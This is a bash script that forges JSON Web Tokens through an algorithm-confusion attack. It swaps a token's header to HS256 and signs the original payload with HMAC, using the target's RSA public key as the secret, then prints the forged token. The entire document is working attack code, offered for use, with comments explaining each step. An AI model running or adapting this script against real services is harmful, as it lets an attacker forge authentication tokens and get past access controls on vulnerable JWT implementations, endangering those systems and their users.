#!/bin/bash


# basic args check
if [ $# -lt 2 ]
then
    echo 'Usage: ./jwt_HS256.sh [existing token] [public key (public.pem]'
    exit 1
fi

# this always decodes to {"typ":"JWT","alg":"HS256"}
alg_b64="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9"

# get the second field delimited by periods
payload=$(echo -n "{$1}" | cut -d "." -f 2)

# convert the public hey to hex to pass into openssl
# xxd to convert to hex, tr to remove newline
hexkey=$(cat ${2} | xxd -p | tr -d "\n")

# combine alg_b64 with data, then sign as HS256 key using hex-formatted public key
# cut second field of output since it comes out like 
# "(stdin)= 4325550ba35874792be303bd5e7bf600f30df1ca23b5d4b4e14e0c3df8dde58f"

hex_hs256=$(echo -n "${alg_b64}.${payload}" | openssl dgst -sha256 -mac HMAC -macopt hexkey:${hexkey} | cut -d " " -f 2)

# convert that hex to binary then base64
secret=$(python3 -c "import base64, binascii; print(base64.urlsafe_b64encode(binascii.a2b_hex('${hex_hs256}')).decode().replace('=',''))")

# newline + new jwt
echo ""
echo "New token: ${alg_b64}.${payload}.${secret}"
